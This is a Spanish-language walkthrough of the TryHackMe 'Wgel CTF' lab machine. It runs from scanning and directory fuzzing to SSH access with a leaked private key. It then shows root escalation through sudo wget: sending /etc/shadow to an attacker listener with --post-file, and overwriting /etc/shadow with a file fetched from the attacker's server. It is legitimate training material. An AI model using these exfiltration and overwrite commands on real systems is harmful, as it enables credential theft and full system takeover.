## TryHackMe  <> Wgel CTF
![image](https://github.com/Esevka/CTF/assets/139042999/5e26ad71-c251-438b-ba43-7eed13496eaf)

Enunciado Informacion : Obtener user.txt y root.txt

---
---

## Escaneo de puertos

Lanzamos una traza ICMP(ping) para ver si la maquina esta activa, segun el ttl obtenido, por proximidad al valor 64 podriamos decir que es una maquina Linux.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/Wgel_CTF/nmap]
    └─# ping -c1 10.10.111.201
    PING 10.10.111.201 (10.10.111.201) 56(84) bytes of data.
    64 bytes from 10.10.111.201: icmp_seq=1 ttl=63 time=51.6 ms
    
    --- 10.10.111.201 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 51.629/51.629/51.629/0.000 ms

Reporte Nmap (Obtenemos puertos abiertos servicios y versiones que estan corriendo).

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/Wgel_CTF/nmap]
    └─# nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.111.201 -oN open_ports
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-02 09:47 CEST
    Initiating SYN Stealth Scan at 09:47
     [...]
    PORT   STATE SERVICE REASON
    22/tcp open  ssh     syn-ack ttl 63
    80/tcp open  http    syn-ack ttl 63


    ┌──(root㉿kali)-[/home/…/Desktop/ctf/Wgel_CTF/nmap]
    └─# nmap -p 22,80 -sCV 10.10.111.201 -vvv -oN info_ports                        
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-02 09:50 CEST
    NSE: Loaded 155 scripts for scanning.
    NSE: Script Pre-scanning.
    [...]
    
    PORT   STATE SERVICE REASON         VERSION
    22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 94961b66801b7648682d14b59a01aaaa (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR+idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd
    |   256 18f710cc5f40f6cf92f86916e248f438 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK+2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ+jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8=
    |   256 b90b972e459bf32a4b11c7831033e0ce (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt+ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke
    
    80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Apache2 Ubuntu Default Page: It works
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


## Analisis de vulnerabilidades en los servicios y explotacion de los mismos.

Segun el launchpad del servicio OpenSSH 7.2p2 que esta corriento en el puerto 22 y el ttl obtenido anteriormente pordriamos decir que estamos delante de una maquina Linux.

![image](https://github.com/Esevka/CTF/assets/139042999/a445ff83-cfc4-46a8-bf4e-c9a636548566)

--Puerto 80

Cargamos la web y encontramos la pagina por defecto de Apache2 nada interesante, revisamos como siempro el codigo de la web por si acaso y encontramos lo siguiente.

![image](https://github.com/Esevka/CTF/assets/139042999/df66790e-53e7-4ecc-b807-bb7a84538ac2)

---
POSIBLE USUARIO ---> jessie
---

No vemos nada mas por lo que vamos a fuzzear la web en busca de directorios.

    ┌──(root㉿kali)-[/home/kali/Desktop/ctf/Wgel_CTF]
    └─# gobuster dir -u http://10.10.111.201 -w /usr/share/wordlists/dirb/common.txt -o fuzz
    ===============================================================
    Gobuster v3.5
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    [...]
    ===============================================================
    /.htaccess            (Status: 403) [Size: 278]
    /.hta                 (Status: 403) [Size: 278]
    /.htpasswd            (Status: 403) [Size: 278]
    /index.html           (Status: 200) [Size: 11374]
    /server-status        (Status: 403) [Size: 278]
    /sitemap              (Status: 301) [Size: 316] [--> http://10.10.111.201/sitemap/]
    
Revisamos la url encontrada pero no encontramos nada interesante que nos pueda ayudar por lo que fuzzeamos el directorio anterior en busqueda de subdirectorios

    ┌──(root㉿kali)-[/home/kali/Desktop/ctf/Wgel_CTF]
    └─# gobuster dir -u http://10.10.111.201/sitemap -w /usr/share/wordlists/dirb/common.txt -o fuzz1
    ===============================================================
    Gobuster v3.5
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    [...]
    ===============================================================
    /.htaccess            (Status: 403) [Size: 278]
    /.hta                 (Status: 403) [Size: 278]
    /.htpasswd            (Status: 403) [Size: 278]
    /.ssh                 (Status: 301) [Size: 321] [--> http://10.10.111.201/sitemap/.ssh/]
    /css                  (Status: 301) [Size: 320] [--> http://10.10.111.201/sitemap/css/]
    /fonts                (Status: 301) [Size: 322] [--> http://10.10.111.201/sitemap/fonts/]
    /images               (Status: 301) [Size: 323] [--> http://10.10.111.201/sitemap/images/]
    /index.html           (Status: 200) [Size: 21080]
    /js                   (Status: 301) [Size: 319] [--> http://10.10.111.201/sitemap/js/]
    Progress: 4579 / 4615 (99.22%)
    ===============================================================
    2023/08/02 10:10:40 Finished
    ===============================================================

Super real, un directorio /.ssh, posiblemente como en otros casos contenga una clave privada.

![image](https://github.com/Esevka/CTF/assets/139042999/880ee7d4-567b-4ecb-bc29-a3b7d693f241)

![image](https://github.com/Esevka/CTF/assets/139042999/ed1c5a82-9a9d-4862-a422-1f37b8d70f49)


Seguramente esta clave privada sea del usuario jessie encontrado anteriormente, vamos a conectarnos con esta clave por el servicio ssh del puerto 22.

Creamos un fichero llamado id_rsa con el contenido de la llave privada encontrada y le damos permiso solo de lectura.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/Wgel_CTF/content]
    └─# echo '-----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
    m+JYAquy30lSp5jH/bhcvYLsK+T9zE
    [...]
    -----END RSA PRIVATE KEY-----' > id_rsa
    
    ┌──(root㉿kali)-[/home/…/Desktop/ctf/Wgel_CTF/content]
    └─# chmod 400 id_rsa 

Nos conectamos al servicio ssh y obtenemos acceso a la maquina.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/Wgel_CTF/content]
    └─# ssh jessie@10.10.111.201 -i id_rsa 
    The authenticity of host '10.10.111.201 (10.10.111.201)' can't be established.
    ED25519 key fingerprint is SHA256:6fAPL8SGCIuyS5qsSf25mG+DUJBUYp4syoBloBpgHfc.
    This host key is known by the following other names/addresses:
        ~/.ssh/known_hosts:28: [hashed name]
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '10.10.111.201' (ED25519) to the list of known hosts.
    Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
    8 packages can be updated.
    8 updates are security updates.
    
    jessie@CorpOne:~$ whoami;id
    jessie
    uid=1000(jessie) gid=1000(jessie) groups=1000(jessie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)


## Post Explotacion Obtencion de flags y Escalada de privilegios jessie to root.

Ya que tenemos acceso a la maquina verificamos sistema y version y efectivamente es lo que suponiamos.
      
    jessie@CorpOne:~$ lsb_release -a
    No LSB modules are available.
    Distributor ID: Ubuntu
    Description:    Ubuntu 16.04.6 LTS
    Release:        16.04
    Codename:       xenial

Buscamos la flag de usuario

    jessie@CorpOne:~$ find / -name '*user*flag*' 2>/dev/null
        /home/jessie/Documents/user_flag.txt

    jessie@CorpOne:~$ cat /home/jessie/Documents/user_flag.txt 
        057c67131c3d5e4...cd3075b198ff6

--Elevamos Privilegios

Listamos los comandos que nos estan permitidos ejecutar como root en la maquina victima.
    
        jessie@CorpOne:~$ sudo -l
        Matching Defaults entries for jessie on CorpOne:
            env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
        
        User jessie may run the following commands on CorpOne:
            (ALL : ALL) ALL
            (root) NOPASSWD: /usr/bin/wget

Encontramos un articulo donde podemos abusar del comando wget para escalar privilegios ---> https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/

1) Exfiltramos el fichero /etc/shadow (El fichero /etc/shadow almacena las contraseñas de las cuentas de usuario) , para ello utilizaremos --post-file

    Nos ponemos en escucha con netcat en nuestra maquina
   
        ┌──(root㉿kali)-[/home/kali]
        └─# nc -lnvp 1988
        listening on [any] 1988 ...

   Exfiltramos los datos con wget

        jessie@CorpOne:~$ sudo /usr/bin/wget --post-file=/etc/shadow 10.9.92.151:1988
        --2023-08-02 12:17:40--  http://10.9.92.151:1988/
        Connecting to 10.9.92.151:1988... connected.
        HTTP request sent, awaiting response... 

    
    Obtenemos el contenido del fichero /etc/shadow (Info sobre /etc/shadow --> https://blog.elhacker.net/2022/02/icheros-etc-passwd-shadow-y-group.html)

        ┌──(root㉿kali)-[/home/kali]
        └─# nc -lnvp 1988
        listening on [any] 1988 ...
        connect to [10.9.92.151] from (UNKNOWN) [10.10.111.201] 49820
        POST / HTTP/1.1
        User-Agent: Wget/1.17.1 (linux-gnu)
        Accept: */*
        Accept-Encoding: identity
        Host: 10.9.92.151:1988
        Connection: Keep-Alive
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 1273
        
        root:!:18195:0:99999:7:::
        daemon:*:17953:0:99999:7:::
        bin:*:17953:0:99999:7:::
        sys:*:17953:0:99999:7:::
        sync:*:17953:0:99999:7:::
        games:*:17953:0:99999:7:::
        man:*:17953:0:99999:7:::
       [...]


2) Creamos una nueva clave para el usuario root mediante openssl(con esta ayuda tenemos todo lo necesario para crear la clave)
   Segun la info obtenida del enlace anterior sobre el fichero shadow la clave esta formada de la siguiente manera( $id$salt$hashed )

       ┌──(root㉿kali)-[/home/kali]
        └─# openssl passwd --help              
        Usage: passwd [options] [password]
        
        General options:
         -help               Display this summary
        
        Input options:
         -in infile          Read passwords from file
         -noverify           Never verify when reading password from terminal
         -stdin              Read passwords from stdin
        
        Output options:
         -quiet              No warnings
         -table              Format output as table
         -reverse            Switch table columns
        
        Cryptographic options:
         -salt val           Use provided salt
         -6                  SHA512-based password algorithm
         -5                  SHA256-based password algorithm
         -apr1               MD5-based password algorithm, Apache variant
         -1                  MD5-based password algorithm
         -aixmd5             AIX MD5-based password algorithm
        
        Random state options:
         -rand val           Load the given file(s) into the random number generator
         -writerand outfile  Write random data to the specified file
        
        Provider options:
         -provider-path val  Provider load path (must be before 'provider' argument if required)
         -provider val       Provider to load (can be specified multiple times)
         -propquery val      Property query used when fetching algorithms
        
        Parameters:
         password            Password text to digest (optional)


   Creamos la clave
   
       ┌──(root㉿kali)-[/home/kali]
        └─# openssl passwd -6 -salt 1234 esevka 
        $6$1234$g1lWhEG.uAVQXEMduV0nyGCd2D3LlPeru53Iln.V18hdvHu53MU7PbZ48pEdBQAgrms1tCN7ccWH8APR2aOvo.
       
3)Modificamos el fichero shadow que nos descargamos y le metemos la clave que hemos creado

    root:$6$1234$g1lWhEG.uAVQXEMduV0nyGCd2D3LlPeru53Iln.V18hdvHu53MU7PbZ48pEdBQAgrms1tCN7ccWH8APR2aOvo.:18195:0:99999:7:::
    daemon:*:17953:0:99999:7:::
    bin:*:17953:0:99999:7:::
    sys:*:17953:0:99999:7:::

4)Sobreescribimos el fichero shadow de la maquina victima con el nuestro que tiene la clave de root modificada.

Montamos un servidor web para compartir nuestro fichero shadow

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/Wgel_CTF/content]
        └─# python -m http.server 80
        Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
        10.9.92.151 - - [02/Aug/2023 11:45:59] "GET / HTTP/1.1" 200 -

Nos descargamos y sobreescribimos el fichero shadow en la maquina victima con wget.

    jessie@CorpOne:~$ sudo /usr/bin/wget http://10.9.92.151/shadow -O /etc/shadow
    --2023-08-02 12:47:05--  http://10.9.92.151/shadow
    Connecting to 10.9.92.151:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 1366 (1,3K) [application/octet-stream]
    Saving to: ‘/etc/shadow’
    
    /etc/shadow                                     100%[=======================================================================================================>]   1,33K  --.-KB/s    in 0s      
    
    2023-08-02 12:47:05 (107 MB/s) - ‘/etc/shadow’ saved [1366/1366]

5)Cambiamos a root y mostramos la flag

    jessie@CorpOne:~$ su root
    Password:  ===========> ponemos nuestra clave

    root@CorpOne:/home/jessie# cat /root/root_flag.txt 
    b1b968b37519a....408188649263d



---
---> Maquina Wgel CTF completa. <---
---
---



